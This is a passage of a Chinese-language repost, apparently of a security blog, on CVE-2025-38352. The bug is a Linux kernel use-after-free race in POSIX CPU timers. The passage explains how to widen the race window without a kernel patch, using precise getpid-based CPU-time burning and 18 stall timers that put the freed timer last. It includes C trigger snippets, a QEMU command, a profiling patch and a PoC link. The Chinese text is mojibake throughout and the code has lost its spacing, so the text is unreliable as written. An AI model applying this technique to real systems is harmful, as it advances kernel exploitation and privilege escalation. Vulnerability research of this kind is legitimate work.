#  CVE-2025-38352 Part 2 - æ— éœ€å†…æ ¸è¡¥ä¸å»¶é•¿ç«äº‰çª—å£  
Faraz
                    Faraz  securitainment   2026-01-26 05:37  
  
<table><thead><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">é“¾æ¥</span></section></th><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">è¯´æ˜</span></section></th></tr></thead><tbody><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">https://faith2dxy.xyz/2025-12-24/cve_2025_38352_analysis_part_2/</span></section></td><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">Faraz</span></section></td></tr></tbody></table>  
åœ¨ part 1 ä¸­ï¼Œæˆ‘æŒ‰æ­¥éª¤æ¼”ç¤ºäº†å¦‚ä½•æ„é€ ä¸€ä¸ªèƒ½å¤Ÿè§¦å‘æ¼æ´çš„ PoCã€‚ä½†å¾ˆé—æ†¾ï¼Œå®ƒå­˜åœ¨ä¸€äº›é—®é¢˜ï¼š  
1. å¦‚æœä¸æ‰“æˆ‘å¼•å…¥çš„é‚£ä¸ª kernel patch (ç”¨æ¥ äººä¸ºæŠŠç«äº‰çª—å£å»¶é•¿ 500 ms)ï¼Œå®ƒå‡ ä¹ä»ä¸æˆåŠŸã€‚  
  
1. timer çš„è®¾ç½®æ–¹å¼æœ¬èº«ä¹Ÿä¸å¤Ÿâ€œå¹²å‡€â€ã€‚æ˜¾ç„¶è¿˜æœ‰æ›´å¥½çš„æ–¹æ³•ï¼Œå¯ä»¥æ¶ˆè€—ä¸€æ®µå¯æ§çš„ CPU timeï¼Œè®© timer åœ¨æœªæ¥æŸä¸ªå¯æ§çš„æ—¶åˆ»è§¦å‘ã€‚  
  
åœ¨è¿™ç¯‡æ–‡ç« é‡Œï¼Œæˆ‘ä¼šå¸¦ä½ ä¸€æ­¥æ­¥çœ‹æˆ‘æ˜¯å¦‚ä½•è§£å†³ä»¥ä¸Šä¸¤ä¸ªé—®é¢˜ï¼Œæœ€ç»ˆå¾—åˆ°ä¸€ä¸ªä¸éœ€è¦ä»»ä½• kernel patch çš„ PoCã€‚  
## PoC + æ¼”ç¤º  
  
è€è§„çŸ©ï¼Œå¦‚æœä½ åªæ˜¯æ¥æ‹¿ PoC çš„ï¼Œé“¾æ¥åœ¨è¿™é‡Œï¼š  
  
https://github.com/farazsth98/poc-CVE-2025-38352/blob/main/poc.c  
  
ä»¥åŠä¸€ä¸ªç®€çŸ­ demo (ä¸å¸¦ KASAN)! ğŸ˜„  
  
![demo](https://mmbiz.qpic.cn/mmbiz_gif/hoiaQy7WhTCPaZqqxK9GYFKIeFLPqibZSkr8gKS93s2sicudUkQicx2dmGUUp5l7n5wbkLHV2KU6sJNhLhH966mLUA/640?wx_fmt=gif&from=appmsg "")  
  
demo  
  
ä½œä¸ºå‚è€ƒï¼Œæˆ‘çš„ QEMU å¯åŠ¨å‘½ä»¤å¦‚ä¸‹ï¼š  
```
qemu-system-x86_64Â \Â  Â  -enable-kvmÂ \Â  Â  -cpu hostÂ \Â  Â  -smp 4Â \Â  Â  -kernel ./bzImageÂ \Â  Â  -initrd ./initramfs.tgzÂ \Â  Â  -nographicÂ \Â  Â  -appendÂ "console=ttyS0 kgdbwait kgdboc=ttyS1,115200 oops=panic panic=0 nokaslr"\Â  Â  -m 3GÂ \Â  Â  -netdev user,id=mynet0Â \Â  Â  -device virtio-net-pci,netdev=mynet0Â \Â  Â  -s
```  
## å›é¡¾  
  
ç»§ç»­ä¹‹å‰è¯·å…ˆè¯»å®Œæœ¬ç³»åˆ—çš„ part 1!  
  
åœ¨ä¹‹å‰çš„ PoC é‡Œï¼Œæˆ‘åœ¨Â REAPEE  
çº¿ç¨‹ä¸­è¿™æ ·æ¶ˆè€— CPU timeï¼Œä»¥ä¾¿è§¦å‘æ¼æ´ï¼š  
```
voidreapee(void) {// [ ... ]structÂ itimerspec ts = {Â  Â  Â  Â  .it_intervalÂ = {0,Â 0},Â  Â  Â  Â  .it_valueÂ = {Â  Â  Â  Â  Â  Â  .tv_secÂ =Â 0,Â  Â  Â  Â  Â  Â  .tv_nsecÂ = wait_time,Â // Custom wait timeÂ  Â  Â  Â  },Â  Â  };// Wait for parent to attachpthread_barrier_wait(&barrier);SYSCHK(timer_settime(timer,Â 0, &ts,Â NULL));// Use some CPU time to make sure the timer will fire correctlyforÂ (intÂ i =Â 0; i <Â 1000000; i++);// Hopefully we used enough CPU time to trigger the timer after `exit_notify()`// zombifies us and wakes up the parent processreturn;}
```  
  
wait_time  
é€šè¿‡Â argv  
ä¼ å…¥ï¼Œè€ŒÂ for  
å¾ªç¯åŸºæœ¬æ˜¯â€œæ‹è„‘è¢‹â€å†™äº†ä¸ªèƒ½ç”¨çš„å€¼ã€‚æœ¬è´¨ä¸Šï¼Œåœ¨è®¾ç½® timer ä¹‹ååˆ°åº•ä¼šæ¶ˆè€—å¤šå°‘ CPU timeï¼Œæ˜¯å®Œå…¨ä¸å¯æ§çš„ã€‚  
  
èƒ½æ”¹è¿›å—ï¼Ÿå½“ç„¶å¯ä»¥ï¼  
## CPU Scheduler å†…éƒ¨æœºåˆ¶ (å…¶å®ä¹Ÿæ²¡é‚£ä¹ˆæ·±å…¥)  
  
ä¸ºäº†ç†è§£å¦‚ä½•æ§åˆ¶çº¿ç¨‹ä½¿ç”¨çš„ CPU timeï¼Œæˆ‘åšäº†ä¸€æ¬¡â€œåŠæ·±å…¥â€çš„è°ƒç ”ï¼šCPU schedulerã€POSIX timersï¼Œä»¥åŠä¸åŒç±»å‹çš„ CPU timers (CPUCLOCK_PROF  
ã€CPUCLOCK_VIRT  
ã€CPUCLOCK_SCHED  
) çš„å·¥ä½œæ–¹å¼ã€‚  
### å…³é”®è¦ç‚¹æ€»ç»“  
  
æˆ‘ä¸ä¼šåœ¨è¿™é‡Œé’»å¾—å¤ªæ·± (è¯´å®è¯è¿™å®Œå…¨å€¼å¾—å•ç‹¬å†™ä¸€ç¯‡åšå®¢)ï¼Œè¿™é‡Œåªæ€»ç»“å‡ ä¸ªå…³é”®ç‚¹ (æ€»ç»“å¯èƒ½å¹¶é 100% ä¸¥è°¨):  
1. CPU scheduler æ¯éš”Â 1 / CONFIG_HZ  
ç§’è§¦å‘ä¸€æ¬¡ä¸­æ–­ï¼Œæ­¤æ—¶ä¼šè¿è¡ŒÂ run_posix_cpu_timers()  
ã€‚  
  
1. Android ä¸ Ubuntu kernels ä¸€èˆ¬éƒ½æ˜¯è¿™ç§æƒ…å†µã€‚  
  
1. é€šå¸¸Â CONFIG_HZ=1000  
ï¼Œä¹Ÿå°±æ˜¯ CPU scheduler çš„ä¸€æ¬¡ "tick" å¤§çº¦æ¯ 1 ms å‘ç”Ÿä¸€æ¬¡ã€‚  
  
1. CPU clock timers ä¸»è¦æœ‰ä¸‰ç§ï¼š  
  
1. CPUCLOCK_PROF  
â€” ç»Ÿè®¡ userland + kernel çš„æ€» CPU timeã€‚  
  
1. CPUCLOCK_VIRT  
â€” åªç»Ÿè®¡ userland çš„æ€» CPU timeã€‚  
  
1. CPUCLOCK_SCHED  
â€” ç»Ÿè®¡å®é™…åœ¨ CPU ä¸Šè¿è¡Œçš„æ€»æ—¶é—´ã€‚å¯¹ä¼šè¢« scheduler é¢‘ç¹æ¢å…¥æ¢å‡ºçš„ threads å¾ˆé‡è¦ã€‚  
  
1. timer çš„åˆ°æœŸæ£€æŸ¥æ€»æ˜¯åœ¨ tick è¾¹ç•Œå‘ç”Ÿï¼Œå› æ­¤æœ€å¤šæ¯éš”Â 1 / CONFIG_HZ  
ç§’æ£€æŸ¥ä¸€æ¬¡ã€‚  
  
1. CPUCLOCK_PROF  
ä¸Â CPUCLOCK_VIRT  
åªæœ‰åœ¨æ¶ˆè€—äº†Â 1 / CONFIG_HZ  
çš„ CPU time ä¹‹åæ‰ä¼šè¢«Â æ›´æ–°  
ã€‚  
  
1. CPUCLOCK_SCHED  
æ˜¯ç‰¹ä¾‹ï¼Œå®ƒä¼šæ¯çº³ç§’æ›´æ–°ä¸€æ¬¡ã€‚  
  
1. è¿™æ„å‘³ç€å½“éœ€è¦æ¯” 1 ms æ›´ç»†çš„ç²’åº¦æ—¶ï¼ŒCPUCLOCK_SCHED  
å¸¸ç”¨äº profilingã€‚  
  
1. ä»â€œè§¦å‘æ¼æ´â€è§’åº¦è®²ï¼Œç†è®ºä¸Šä¸‰ç§ clock types éƒ½èƒ½ç”¨ã€‚  
  
1. æˆ‘çš„ PoC å¯¹ timer ä½¿ç”¨çš„æ˜¯Â CLOCK_THREAD_CPUTIME_ID  
ï¼Œå®ƒå±äºÂ CPUCLOCK_SCHED  
timerã€‚  
  
1. ä¸ºä»€ä¹ˆè¦ç”¨è¿™ä¸ªç‰¹å®šç±»å‹ï¼Œåæ–‡ä¼šè§£é‡Šã€‚  
  
ä»¥ä¸Šå†…å®¹åº”è¯¥è¶³å¤Ÿæ”¯æ’‘ä½ ç†è§£åé¢çš„éƒ¨åˆ†ã€‚  
### Profiling CPU Time ä½¿ç”¨é‡  
  
ä¸ºäº†æ¶ˆè€—ä¸€æ®µå¯æ§çš„ CPU timeï¼Œæˆ‘ä»¬å¿…é¡»å…ˆçŸ¥é“ï¼šæŸä¸ªâ€œå…·ä½“å·¥ä½œé‡â€å¤§çº¦ä¼šæ¶ˆè€—å¤šå°‘æ—¶é—´ã€‚  
  
åš profiling æ—¶ï¼Œæˆ‘ä»¬éœ€è¦èƒ½åœ¨ä¸¤ä¸ªæˆ–æ›´å¤šæ‰§è¡Œç‚¹è·å– (è¢« profiling çš„çº¿ç¨‹) å·²æ¶ˆè€—çš„æ€» CPU timeã€‚å¯ä»¥ç”¨Â clock_gettime  
system call æ¥å®ç°ã€‚  
  
ä½œä¸ºè¦ profiling çš„â€œå…·ä½“å·¥ä½œé‡â€ï¼Œæˆ‘é€‰æ‹©äº†Â getpid  
system callï¼šå®ƒæ˜“ç”¨ï¼Œè€Œä¸”æ¶ˆè€—çš„ CPU time å¾ˆå°‘ã€‚  
  
å½“ç„¶ï¼Œclock_gettime  
system call æœ¬èº«ä¹Ÿä¼šæ¶ˆè€— CPU timeï¼Œæ‰€ä»¥åœ¨ profiling ä»£ç é‡Œä¹Ÿå¿…é¡»æŠŠè¿™éƒ¨åˆ†å¼€é”€ç®—è¿›å»ã€‚  
  
ä¸ºæ­¤ï¼Œè¿™é‡Œæœ‰ä¸€æ®µ PoC ä»£ç ï¼Œç”¨æ¥ä¼°ç®—Â getpid  
system call å…·ä½“æ¶ˆè€—å¤šå°‘ CPU time (å®Œæ•´ PoC ç‚¹è¿™é‡Œ):  
```
#defineNUM_SAMPLES100000staticlongintÂ clock_gettime_avg =Â 0;// Can overflow if `NUM_SAMPLES` is too high, but with simple syscalls,// this works just finelongintgetpid_avg_cputime_used() {structtimespecÂ *ts =Â malloc(NUM_SAMPLES *Â sizeof(structtimespec));ifÂ (clock_gettime_avg ==Â 0) {forÂ (intÂ i =Â 0; i < NUM_SAMPLES; i++) {syscall(__NR_clock_gettime, CLOCK_THREAD_CPUTIME_ID, &ts[i]);Â  Â  Â  Â  }longintÂ total_nsec =Â 0;forÂ (intÂ i =Â 0; i < NUM_SAMPLES-1; i++) {longintÂ time_taken = (longint)(ts_to_ns(&ts[i +Â 1]) -Â ts_to_ns(&ts[i]));Â  Â  Â  Â  Â  Â  total_nsec += time_taken;Â  Â  Â  Â  }Â  Â  Â  Â  clock_gettime_avg = total_nsec / (NUM_SAMPLES-1);Â  Â  }forÂ (intÂ i =Â 0; i < NUM_SAMPLES; i++) {syscall(__NR_clock_gettime, CLOCK_THREAD_CPUTIME_ID, &ts[i]);// Do whatever you're measuring heresyscall(__NR_getpid);Â  Â  }longintÂ total_nsec =Â 0;forÂ (intÂ i =Â 0; i < NUM_SAMPLES-1; i++) {longintÂ time_taken = (longint)(ts_to_ns(&ts[i +Â 1]) -Â ts_to_ns(&ts[i])) - clock_gettime_avg;Â  Â  Â  Â  total_nsec += time_taken;Â  Â  }free(ts);returnÂ total_nsec / (NUM_SAMPLES-1);}
```  
  
ä¸‹é¢æ˜¯æˆ‘åœ¨ QEMU VM (4 cores, 3GB RAM) ä¸Šè·‘å‡ºçš„è¾“å‡ºï¼š  
```
/Â # /pocclock_gettime avg: 489 nsgetpid avg: 139 ns/Â # /pocclock_gettime avg: 495 nsgetpid avg: 143 ns/Â # /pocclock_gettime avg: 491 nsgetpid avg: 133 ns/Â # /pocclock_gettime avg: 495 nsgetpid avg: 130 ns
```  
  
æ˜¾ç„¶ï¼Œè¿™æ®µ PoC ç”¨çš„æ˜¯å¹³å‡å€¼ï¼Œæ‰€ä»¥æ—¶é—´å¹¶ä¸æ˜¯ 100% ç²¾ç¡®ï¼›ä½†ä»»ä½• system call çš„ CPU time åœ¨å¤šæ¬¡è¿è¡Œä¹‹é—´éƒ½ä¸å¯èƒ½å®Œå…¨ä¸€è‡´ï¼Œå› æ­¤æˆ‘è®¤ä¸ºå–å¹³å‡å€¼åŸºæœ¬å°±æ˜¯èƒ½åšåˆ°çš„æœ€å¥½æ•ˆæœäº† (è‡³å°‘æˆ‘ç›®å‰æ˜¯è¿™ä¹ˆè§‰å¾—çš„â€¦â€¦å¦‚æœä½ æœ‰æ›´å¥½çš„è®¡ç®—æ–¹å¼ï¼Œæ¬¢è¿å‘Šè¯‰æˆ‘!)  
## ç¬¬ä¸€ä¸ªæ”¹è¿›ï¼šå¯æ§çš„ CPU Time æ¶ˆè€—  
  
æˆ‘ä»¬å¯¹ PoC çš„ç¬¬ä¸€ä¸ªæ”¹è¿›ï¼Œæ˜¯è®©Â REAPEE  
çº¿ç¨‹ä»¥æ›´å¯æ§çš„æ–¹å¼æ¶ˆè€— CPU timeï¼Œåšæ³•å¦‚ä¸‹ï¼š  
1. ç”¨ profiling ä»£ç å¾—åˆ°Â getpid  
system call çš„å¹³å‡ CPU timeã€‚  
  
1. å°† timer è®¾ç½®ä¸ºåœ¨æ¶ˆè€— 1 ms (1,000,000  
ns) CPU time åè§¦å‘ã€‚  
  
1. å¾ªç¯æ‰§è¡ŒÂ getpid  
system call è¶³å¤Ÿå¤šæ¬¡ï¼Œä»¥æ¶ˆè€—æ¥è¿‘ 1 ms çš„ CPU time (å…³é”®æ˜¯ä¸è¦æŠŠå®ƒå®Œå…¨æ¶ˆè€—å®Œ!)ã€‚  
  
åˆ°è¿™é‡Œï¼Œå‰©ä½™çš„ CPU time å°†ç”± kernel åœ¨Â do_exit() -> exit_notify()  
ä¸­æ¶ˆè€—ï¼›å¦‚æœÂ getpid  
å¾ªç¯æ¶ˆè€—çš„ CPU timeÂ åˆšåˆšå¥½  
ï¼Œé‚£ä¹ˆ timer å°±åº”è¯¥åœ¨Â exit_notify()  
å°†Â REAPEE  
çº¿ç¨‹ zombify å¹¶å”¤é†’è´Ÿè´£å›æ”¶çš„çˆ¶è¿›ç¨‹ä¹‹åè§¦å‘ï¼Œä»è€Œè§¦å‘Â handle_posix_cpu_timers()  
ã€‚  
> **ä¸Šé¢ç¬¬ 3 æ­¥è¿˜èƒ½æ›´ç²¾ç¡®ï¼šå¯ä»¥é€šè¿‡ patch kernel æ¥ profilingÂ do_exit() -> exit_notify()æ¶ˆè€—çš„ CPU timeï¼Œä¸è¿‡æˆ‘æš‚æ—¶è¿˜æ²¡æŠ˜è…¾è¿™ä¸€æ­¥ã€‚**  
  
  
ä¸‹é¢æ˜¯ PoC ä¸­ä½“ç°çš„æ”¹åŠ¨ï¼š  
```
// Get the average CPU time usage of the `getpid()` syscall, so we// can use it for the trigger latergetpid_avg = getpid_cpu_usage();// [ ... ]// After timers are armed, waste just the right amount of CPU time now// without firing any of the timersforÂ (intÂ i =Â 0; i < ((ONE_MS_NS / getpid_avg) - syscall_loop_times); i++) {syscall(__NR_getpid);}// This `return` will trigger `do_exit()` in the kernel, which hopefully will// fire the timers after `exit_notify()` wakes up the `waitpid()` in the exploit// parent processreturn;
```  
  
åœ¨ä¸Šé¢çš„ PoC ä¸­ï¼Œsyscall_loop_times  
æ˜¯ä¸€ä¸ªå˜é‡ï¼šåˆå§‹ä¸º 20ï¼Œæ¯æ¬¡é‡è¯•éƒ½ä¼šé€’å¢ï¼Œåœ¨æˆ‘çš„ PoC ä¸­ä¸Šé™ä¸ºÂ SYSCALL_LOOP_TIMES_MAX=150  
ã€‚ç”±äº CPU time çš„æ¶ˆè€—å¹¶ä¸æ€»æ˜¯ç²¾ç¡®ï¼Œæˆ‘çš„æœ€ç»ˆ PoC ä¼šåœ¨æ¯æ¬¡é‡è¯•æ—¶å¢åŠ è¿™ä¸ªå€¼ï¼Œä»¥ç¡®ä¿æœ€ç»ˆèƒ½å‘½ä¸­ç«äº‰çª—å£ã€‚  
  
ä»…è¿™ä¸€å¤„æ”¹åŠ¨ï¼Œå°±å¤§å¹…æå‡äº†Â handle_posix_cpu_timers()  
åœ¨Â exit_notify()  
å”¤é†’å›æ”¶çˆ¶è¿›ç¨‹ä¹‹åæ‰è¿è¡Œçš„æ¦‚ç‡ã€‚  
  
å¦å¤–ï¼Œè¿™ä¹Ÿè®© PoC æ›´ system-agnosticï¼šä¸åŒç³»ç»Ÿåœ¨åšåŒæ ·çš„å·¥ä½œé‡æ—¶ï¼Œå®é™…æ¶ˆè€—çš„ CPU time å¯èƒ½ä¸åŒã€‚  
## å»¶é•¿ç«äº‰çª—å£ (Part 1)  
  
ç°åœ¨æ¥çœ‹ç¬¬äºŒä¸ª (ä¹Ÿå¯èƒ½æ›´çƒ¦äººçš„) é—®é¢˜ï¼š**æˆ‘ä»¬è¯¥å¦‚ä½•å»¶é•¿ç«äº‰çª—å£ï¼Ÿ**  
### ä½¿ç”¨æ›´å¤š Timers  
  
ç¬¬ä¸€ä¸ªæƒ³åˆ°çš„æ”¹è¿›åº”è¯¥å¾ˆç›´è§‚ã€‚è¿˜è®°å¾—Â handle_posix_cpu_timers()  
ä¼šæŠŠæ‰€æœ‰è§¦å‘çš„ timers æ”¶é›†åˆ°ä¸€ä¸ªæœ¬åœ°Â firing  
list é‡Œï¼Œç„¶åéå†å®ƒä»¬ (ä»£ç å¦‚ä¸‹ï¼Œå·²ç®€åŒ–):  
```
staticvoidhandle_posix_cpu_timers(structÂ task_struct *tsk){// Faith: local `firing` listLIST_HEAD(firing);ifÂ (!lock_task_sighand(tsk, &flags))return;doÂ {// [ ... ]// Faith: collect all thread and process timerscheck_thread_timers(tsk, &firing);check_process_timers(tsk, &firing);Â }Â whileÂ (!posix_cpu_timers_enable_work(tsk, start));// [ ... ]unlock_task_sighand(tsk, &flags);// Faith: iterate over the `firing` list and fire the timerslist_for_each_entry_safe(timer, next, &firing, it.cpu.elist) {// [ ... ]Â }}
```  
  
æˆ‘ä¹‹å‰çš„ PoC åªç”¨äº†ä¸€ä¸ª timerï¼Œè¿™æ„å‘³ç€Â firing  
list åªä¼šè¢«éå†ä¸€æ¬¡ã€‚è¿™æ ·ç•™ç»™æˆ‘ä»¬åœ¨ timer è¢«ä½¿ç”¨å‰å»é‡Šæ”¾å®ƒçš„æ—¶é—´å°±å¾ˆå°‘ï¼Œå¯¹å§ï¼Ÿ  
  
æˆ‘ä»¬å¯ä»¥åšä¸¤ä»¶äº‹æ¥æ”¹è¿›ï¼š  
1. æŠŠÂ firing  
list å¡«åˆ°æœ€å¤§å®¹é‡ã€‚  
  
1. è®©Â firing  
list ä¸­æœ€åä¸€ä¸ª timer æˆä¸ºæˆ‘ä»¬çš„ç›®æ ‡ UAF timerã€‚  
  
å¦å¤–ï¼Œhandle_posix_cpu_timers()  
ä¼šå…ˆè°ƒç”¨Â check_thread_timers()  
ï¼Œå†è°ƒç”¨Â check_process_timers()  
ã€‚ç”±äº timers ä¼šè¢«æ’å…¥åˆ°Â firing  
list çš„å°¾éƒ¨ï¼Œæˆ‘ä»¬æ— æ³•åˆ©ç”¨ process timersï¼šå®ƒä»¬éƒ½ä¼šåœ¨æˆ‘ä»¬çš„ UAF timer ä¹‹åè¢«æ’å…¥ã€‚  
  
å› æ­¤åªå‰© thread timers å¯ç”¨ã€‚é‚£ä¹ˆæˆ‘ä»¬æœ€å¤šèƒ½å¾€Â firing  
list é‡Œå¡å¤šå°‘ä¸ªï¼Ÿ  
```
staticvoidcheck_thread_timers(/* ... */){structÂ posix_cputimers *pct = &tsk->posix_cputimers;Â u64 samples[CPUCLOCK_MAX];// [ ... ]task_sample_cputime(tsk, samples);collect_posix_cputimers(pct, samples, firing);// [ ... ]}staticvoidcollect_posix_cputimers(/* ... */){// [ ... ]forÂ (i =Â 0; i < CPUCLOCK_MAX; i++, base++) {Â  base->nextevt =Â collect_timerqueue(&base->tqhead, firing,Â  Â  Â  Â  Â  samples[i]);Â }}#defineMAX_COLLECTED20staticÂ u64Â collect_timerqueue(/* ... */){// [ ... ]whileÂ ((next =Â timerqueue_getnext(head))) {// [ ... ]/* Limit the number of timers to expire at once */ifÂ (++i == MAX_COLLECTED || now < expires)returnÂ expires;// [ ... Add the timer to the `firing` list's tail here ... ]Â }returnÂ U64_MAX;}
```  
  
åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼ŒCPUCLOCK_MAX  
è¡¨ç¤º CPU Scheduler Internals ä¸€èŠ‚é‡Œæåˆ°çš„ä¸‰ç§ clock typesï¼Œå› æ­¤å®ƒçš„å€¼ä¸º 3ã€‚  
  
å¦å¤–æ³¨æ„ï¼Œä¸Šé¢Â collect_timerqueue()  
é‡Œçš„Â MAX_COLLECTED  
åˆ¤æ–­å®é™…ä¸Šå­˜åœ¨ off-by-oneï¼šæ‰€ä»¥æ¯ç§ clock type å¹¶ä¸æ˜¯æœ€å¤šæ”¶é›† 20 ä¸ª timersï¼Œè€Œæ˜¯æœ€å¤šåªä¼šæ”¶é›†åˆ° 19 ä¸ªã€‚  
  
ç»¼åˆèµ·æ¥ï¼Œæˆ‘ä»¬æœ€å¤šå¯ä»¥åœ¨ firing list ä¸­æ”¶é›†Â 19 * 3 = 57  
ä¸ª timersã€‚æ›´å¦™çš„æ˜¯ï¼Œæˆ‘ä»¬è¿˜æœ‰ä¸€ç‚¹â€œè¿æ°”â€ï¼šCPUCLOCK_SCHED  
(ä¹Ÿå°±æ˜¯æˆ‘ä»¬ç”¨æ¥åˆ›å»º UAF timer çš„ clock type) æ°å¥½æ˜¯æœ€åä¸€ç§ clock type!  
```
#defineCPUCLOCK_PROF0#defineCPUCLOCK_VIRT1#defineCPUCLOCK_SCHED2#defineCPUCLOCK_MAX3
```  
  
åœ¨æˆ‘çš„ PoC ä¸­ï¼Œæˆ‘åªä½¿ç”¨äº† 19 ä¸ªÂ CPUCLOCK_SCHED  
ç±»å‹çš„ timersï¼Œå› ä¸ºè¿™æ ·å°±è¶³ä»¥æŠŠç«äº‰çª—å£å»¶é•¿åˆ°èƒ½è§¦å‘æ¼æ´çš„ç¨‹åº¦ã€‚  
  
ä¸è¿‡ï¼Œç”±äºçœŸæ­£çš„åˆ©ç”¨å¾ˆå¯èƒ½éœ€è¦ä½¿ç”¨ cross-cache æŠ€æœ¯ï¼ŒæŠŠå·²é‡Šæ”¾çš„Â struct k_itimer  
é‡æ–°åˆ†é…æˆåˆ«çš„å¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘åé¢å¤§æ¦‚ç‡è¦æŠŠè¿™é‡Œçš„ 57 ä¸ª timers å…¨éƒ½ç”¨ä¸Šã€‚è¿™ä¹Ÿæ˜¯æˆ‘åœ¨ PoC ä¸­é€‰æ‹©Â CPUCLOCK_SCHED  
ç±»å‹ timers çš„åŸå› ï¼šå®ƒèƒ½ç»™æˆ‘ä»¬æœ€å¤§çš„æ½œåœ¨ç«äº‰çª—å£ã€‚  
### ä¸€æ¬¡æ€§è§¦å‘æ‰€æœ‰ Timers  
  
ä¸ºäº†è®©æ‰€æœ‰ timers åŒæ—¶è§¦å‘ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™æ ·ä¸€ä¸ªäº‹å®ï¼šCLOCK_THREAD_CPUTIME_ID  
ç±»å‹ timer åªæœ‰åœ¨â€œåˆ›å»ºè¯¥ timer çš„çº¿ç¨‹â€æ¶ˆè€— CPU time æ—¶æ‰ä¼šæ¨è¿›ã€‚  
  
å› æ­¤ï¼Œè¦è®© 19 ä¸ª timers ä¸€èµ·è§¦å‘ï¼Œæˆ‘ä»¬åªéœ€è¦ï¼š  
1. åœ¨Â REAPEE  
çº¿ç¨‹ä¸Šåˆ›å»ºå…¨éƒ¨ 19 ä¸ª CPU timers (18 ä¸ªâ€œstallâ€timers + æˆ‘ä»¬çš„ UAF timer)ï¼Œç„¶åè®©å®ƒè¿›å…¥ä¼‘çœ ã€‚  
  
1. ç¡®ä¿ä¸æ˜¯ busy sleepï¼Œå¦åˆ™ä¼šæ¶ˆè€— CPU timeã€‚  
  
1. æˆ‘ç”¨Â pthread_barrier_t  
æ¥å®ç°è¿™ä¸€ç‚¹ã€‚  
  
1. åœ¨å¦ä¸€ä¸ªçº¿ç¨‹é‡Œè°ƒç”¨Â timer_settime()  
ï¼ŒæŠŠæ‰€æœ‰ timers éƒ½ arm ä¸ºï¼šåœ¨æ¶ˆè€—Â 1,000,000  
ns (1 ms) çš„ CPU time åè§¦å‘ã€‚  
  
1. ç”±äºè¿™ä¸ªçº¿ç¨‹å¹¶æ²¡æœ‰åˆ›å»ºè¿™äº› timersï¼Œæ‰€ä»¥ timers å®Œå…¨ä¸ä¼šæ¨è¿› (å› ä¸ºæ­£åœ¨ç¡çœ çš„Â REAPEE  
çº¿ç¨‹æ‰æ˜¯å”¯ä¸€èƒ½æ¨è¿›è¿™äº› timers çš„çº¿ç¨‹)ã€‚  
  
1. éœ€è¦ç¡®ä¿æŠŠ 18 ä¸ªâ€œstallâ€timers è®¾ä¸ºåœ¨æ¶ˆè€—Â 1,000,000 - 1  
ns CPU time åè§¦å‘ã€‚  
  
1. è€Œ UAF timer ä»ç„¶è¦åœ¨æ¶ˆè€—Â 1,000,000  
ns CPU time åè§¦å‘ã€‚  
  
1. è¿™æ ·å¯ä»¥ä¿è¯ UAF timer æ˜¯Â firing  
list é‡Œçš„æœ€åä¸€ä¸ªï¼Œå› ä¸º firing list ä¼šæŒ‰åˆ°æœŸæ—¶é—´æ’åºã€‚  
  
å®Œæˆä»¥ä¸Šæ­¥éª¤åï¼Œæˆ‘ä»¬å°±å¯ä»¥å”¤é†’Â REAPEE  
çº¿ç¨‹ï¼Œå¹¶ä½¿ç”¨ä¸Šä¸€èŠ‚çš„æ”¹è¿›æ¥æ¶ˆè€—Â åˆšå¥½  
å°‘äº 1 ms çš„ CPU timeï¼Œä»è€Œåœ¨æ­£ç¡®çš„æ—¶åˆ»è§¦å‘Â handle_posix_cpu_timers()  
ã€‚  
### å¸®åŠ©æœ‰å¤šå¤§ï¼Ÿ  
  
ä¸ºäº†å¼„æ¸…Â handle_posix_cpu_timers()  
ä¸­éå†Â firing  
list å®é™…æ¶ˆè€—äº†å¤šå°‘ CPU timeï¼Œæˆ‘ä½¿ç”¨äº†è¿™ä¸ª kernel patchã€‚æˆ‘ç¡®ä¿å®ƒä¸ä¼šâ€œæ„å¤–å»¶é•¿â€ç«äº‰çª—å£ (æˆ‘çš„æœ€ç»ˆ PoC ä¸ä¾èµ–è¿™ä¸ª patch)ã€‚  
  
patch çš„å…³é”®éƒ¨åˆ†å¦‚ä¸‹ï¼šå®ƒä¼š profiling éå†Â firing  
list å¹¶è§¦å‘æ¯ä¸ª timer æ‰€èŠ±çš„æ—¶é—´ï¼š  
```
@@ -1356,6 +1362,10 @@ static void handle_posix_cpu_timers(struct task_struct *tsk)Â  Â */Â  unlock_task_sighand(tsk, &flags);+ // Faith: profile the time taken to handle the timers+ if (profile)+ Â profile_t0 = ktime_get_mono_fast_ns();+Â  /*Â  Â * Now that all the timers on our list have the firing flag,Â  Â * no one will touch their list entries but us. Â We'll take@@ -1387,6 +1397,13 @@ static void handle_posix_cpu_timers(struct task_struct *tsk)Â  Â rcu_assign_pointer(timer->it.cpu.handling, NULL);Â  Â spin_unlock(&timer->it_lock);Â  }++ // Faith: profile the time taken to handle the timers+ if (profile) {+ Â profile_t1 = ktime_get_mono_fast_ns();+ Â printk("handle_posix_cpu_timers: delta_ns=%llu\n",+ Â  (unsigned long long)(profile_t1 - profile_t0));+ }
```  
  
æˆ‘ç”¨æ¥æµ‹è¯•è¿™æ®µ profiling ä»£ç çš„ PoC åœ¨ è¿™é‡Œã€‚æ³¨æ„ï¼Œè¿™ä¸ª profiling PoC è¿˜åŒ…å«ä¸€äº›ä¼šè¿›ä¸€æ­¥å»¶é•¿ç«äº‰çª—å£çš„æ”¹åŠ¨ (æˆ‘ä¼šåœ¨ä¸‹ä¸€èŠ‚è®¨è®º)ã€‚  
  
è¿™ä¸ª PoC çš„å…³é”®éƒ¨åˆ†å¦‚ä¸‹ (å¯ç›´æ¥ç‚¹é“¾æ¥æŸ¥çœ‹):  
1. REAPEE  
thread åˆ›å»º 19 ä¸ª timers åè¿›å…¥ä¼‘çœ ã€‚  
  
1. main thread arm å…¨éƒ¨ 19 ä¸ª timers å¹¶å”¤é†’Â REAPEE  
threadã€‚  
  
1. REAPEE  
